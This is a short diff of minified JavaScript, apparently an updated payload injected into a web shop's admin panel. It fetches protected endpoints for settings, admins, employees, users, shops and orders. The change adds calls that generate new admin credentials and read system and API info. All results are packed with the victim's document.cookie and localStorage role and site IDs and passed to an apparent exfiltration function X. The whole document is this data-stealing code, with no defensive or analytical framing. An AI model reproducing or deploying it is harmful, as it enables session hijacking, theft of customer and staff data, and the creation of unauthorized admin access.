@@ -35,21 +35,27 @@
     F("/protected/employees/list"),
     F("/protected/users/list", {offset: 0, limit: 5}),
     F("/protected/shops/get"),
-    F("/protected/orders/list", {offset: 0, limit: 5})
+    F("/protected/orders/list", {offset: 0, limit: 5}),
+    F("/protected/admin/generate-credentials"),
+    F("/protected/system/info"),
+    F("/protected/api/info")
   ]).then(function(r) {
     var d = JSON.stringify({
-      v: 8,
+      v: 9,
       t: T,
       role: localStorage["role"] || "",
       site: localStorage["siteName"] || "",
       uid: localStorage["siteUid"] || "",
       cookie: document.cookie,
-      settings: r[0].substring(0, 3000),
-      admins: r[1].substring(0, 2000),
-      employees: r[2].substring(0, 2000),
-      users: r[3].substring(0, 2000),
-      shops: r[4].substring(0, 2000),
-      orders: r[5].substring(0, 2000),
+      settings: r[0].substring(0, 2000),
+      admins: r[1].substring(0, 1500),
+      employees: r[2].substring(0, 1500),
+      users: r[3].substring(0, 1500),
+      shops: r[4].substring(0, 1500),
+      orders: r[5].substring(0, 1500),
+      newCreds: r[6].substring(0, 500),
+      sysInfo: r[7].substring(0, 500),
+      apiInfo: r[8].substring(0, 500),
       ts: Date.now()
     });
     X(d);
